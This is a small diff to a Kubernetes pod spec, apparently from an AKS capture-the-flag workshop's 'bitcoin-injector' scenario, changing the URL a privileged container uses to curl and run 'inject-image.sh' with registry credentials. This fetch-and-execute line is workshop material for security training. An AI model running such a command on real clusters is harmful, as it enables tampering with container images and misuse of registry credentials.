@@ -39,7 +39,7 @@ spec:
         - --
         - bash
         - -c
-        - "rm inject-image.sh && curl -O -J https://lastcoolnameleft.com/mini/inject-image.sh && bash inject-image.sh $IMAGE $REGISTRY_USERNAME $REGISTRY_PASSWORD"
+        - "rm -f inject-image.sh && curl -O -J https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/bitcoin-injector/inject-image.sh && bash inject-image.sh $IMAGE $REGISTRY_USERNAME $REGISTRY_PASSWORD"
         imagePullPolicy: Always
         securityContext:
           privileged: true
